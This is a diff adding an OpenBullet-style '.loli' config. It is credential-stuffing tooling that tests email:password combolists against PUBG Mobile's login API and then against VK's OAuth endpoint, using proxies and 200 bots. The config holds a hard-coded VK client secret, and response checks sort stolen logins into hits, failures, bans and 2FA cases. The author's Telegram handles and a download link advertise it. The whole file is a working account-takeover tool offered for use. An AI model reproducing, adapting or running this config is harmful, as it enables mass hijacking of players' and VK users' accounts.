@@ -1,0 +1,99 @@
+#You can download it as loli from this link:
+https://cdn.discordapp.com/attachments/982266499840491560/1005598057917845504/Pubg_mobile_MR.loli
+virustotal: https://www.virustotal.com/gui/file/6365cba43adec2e26f4b6c17a638fed582ec3c9f1c3f25de08ac3bcfe6481117?nocache=1
+
+my Telegram ID: @MRzodiack2 & @gangano
+
+
+
+[SETTINGS]
+{
+  "Name": "Pubg Mobile",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-17T14:09:12.3434742-07:00",
+  "AdditionalInfo": "Telegram Channel: T.me/Ganganostudio",
+  "RequiredPlugins": [],
+  "Author": "MRzodiack",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#@MRzodiack FUNCTION GetRandomUA -> VAR "UA" 
+
+#@MRzodiack FUNCTION Hash MD5 "<PASS>" -> VAR "TOKEN1" 
+
+#@MRzodiack FUNCTION Hash MD5 "/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\"<USER>\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"<TOKEN1>\"}3ec8cd69d71b7922e2a17445840866b26d86e283" -> VAR "TOKEN2" 
+
+#@MRzodiack FUNCTION RandomString "?d?d?d?d?d?d.?d?d?d" -> VAR "TOKENPRIV1" 
+
+#@MRzodiack FUNCTION Length "{\"account\":\"<USER>\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"<TOKEN1>\"}" -> VAR "LEN" 
+
+#@MRzodiack REQUEST POST "https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig=<TOKEN2>" 
+  CONTENT "{\"account\":\"<USER>\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"<TOKEN1>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Content-Type: application/json; charset=utf-8" 
+  HEADER "User-Agent: <UA>PPR1.<TOKENPRIV1>)" 
+  HEADER "Host: igame.msdkpass.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Length: <LEN>" 
+
+#@MRzodiack KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"token\":\"" 
+    KEY "captcha param invalid" 
+  KEYCHAIN Failure OR 
+    KEY "\"msg\":\"wrong password!\"" 
+    KEY "\"msg\":\"the account does not exists!\"" 
+    KEY "\"msg\":\"Params Email Format is Error!\"" 
+    KEY "\"msg\":\"Params Email is other format!\"" 
+    KEY "require valid account" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "\"msg\":\"2fa needed.\"" 
+
+#@MRzodiack REQUEST GET "https://api.vk.com/oauth/token?2fa_supported=1&client_id=3140623&client_secret=VeWdmVclDCtn6ihuP1nt&device_id=810D2ABF-4A6C-4710-83B8-00D776A4B25B&external_device_id=810D2ABF-4A6C-4710-83B8-00D776A4B25B&grant_type=password&password=<PASS>&sak_version=1.33&scope=all&username=<USER>&v=5.155" 
+  
+  HEADER "User-Agent: com.vk.vkclient/1725 (iPhone, iOS 13.5, iPhone10,5, Scale/3.0)like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#@MRzodiack KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "Username or password is incorrect" 
+    KEY "Username or password is incorrect\",\"" 
+    KEY "username_or_password_is_incorrect" 
+  KEYCHAIN Ban OR 
+    KEY "need_captcha\",\"" 
+    KEY "captcha_sid\":\"" 
+    KEY "https:\\/\\/api.vk.com\\/captcha.php?sid=757117251667" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "error\":\"need_validation\",\"" 
+    KEY "error\":\"need_validation\",\"" 
+    KEY "user has been banned" 
